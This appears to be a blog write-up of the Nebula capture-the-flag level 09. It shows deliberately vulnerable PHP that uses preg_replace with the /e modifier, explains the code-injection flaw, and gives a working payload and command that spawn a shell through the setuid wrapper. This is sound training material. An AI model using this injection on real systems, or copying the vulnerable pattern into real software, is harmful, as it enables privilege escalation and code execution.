---
author: Josh Genao
Date: 2023-01-06
Category:
Tags:
---

# Level-09
## Description
There’s a C setuid wrapper for some vulnerable PHP code.

```
<?php

function spam($email)
{
  $email = preg_replace("/\./", " dot ", $email);
  $email = preg_replace("/@/", " AT ", $email);
  
  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
  $contents = preg_replace("/\[/", "<", $contents);
  $contents = preg_replace("/\]/", ">", $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?>

```
## Setup
SSH into the Nebula VM using the following credentials:

```
username: level09
password: level09
```
## Summary
This PHP code defines two function: spam and markup.

The **spam** function takes an email address as a parameter and replaces the **@** symbol with " AT " and the **.** with " dot ".  The **markup** function takes in two parameters $filename and processes it using the preg_replace function. The `\\2` in the replacement string is a backreference to the second captured group in the search pattern. In this case, the second captured group is `(.*)`, which matches any characters (except a newline) 0 or more times. The contents in the `(.*)` will be passed as the argument to the `spam` function.

The code is vulnerable to code injection as it fails to account for dangerous PCRE modification flags in the input string. The "e" modifier will cause PHP to execute the result of the preg_replace() as the PHP code. [^1]

We can create a file that contains the following contents:

```
[email {${system($use_me)}}]
```

We can call this php code and pass in the following arguments:
`$ /home/flag09/flag09 exploit.txt /bin/sh`
## Flag
![](../imgs/Pasted%20image%2020230110002550.png)
## References
[^1]: http://www.madirish.net/402
